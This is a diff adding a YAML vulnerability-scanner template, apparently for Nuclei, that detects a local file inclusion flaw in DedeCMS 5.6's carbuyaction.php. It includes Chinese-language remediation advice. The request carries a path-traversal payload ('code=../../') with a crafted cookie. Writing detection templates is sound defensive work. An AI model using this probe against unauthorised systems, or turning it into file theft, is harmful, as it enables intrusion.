@@ -1,0 +1,37 @@
+id: dedecms-carbuyaction-fileinclude
+info:
+  name: DedeCmsV5.6 Carbuyaction Fileinclude
+  author:
+  - l0ne1y
+  description: |-
+    DedeCMS carbuyaction.php 文件包含漏洞
+    DedeCMS（织梦内容管理系统）是中国卓卓网络（Desdev）科技有限公司的一套开源的集内容发布、编辑、管理检索等于一体的PHP网站内容管理系统（CMS）。
+
+    DedeCMS 5.6版本中存在文件包含漏洞。攻击者可通过/plus/carbuyaction.php文件的code参数包含本地文件。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://www.dedecms.com/
+
+    临时修复方案：
+    1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断
+    2、过滤.（点）/（反斜杠）\\（反斜杠），编码绕过
+    3、禁止服务器远程文件包含
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - Cod::respond()
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../'
+  method: GET
+  headers:
+    Cookie: code=cod
+  redirects: true
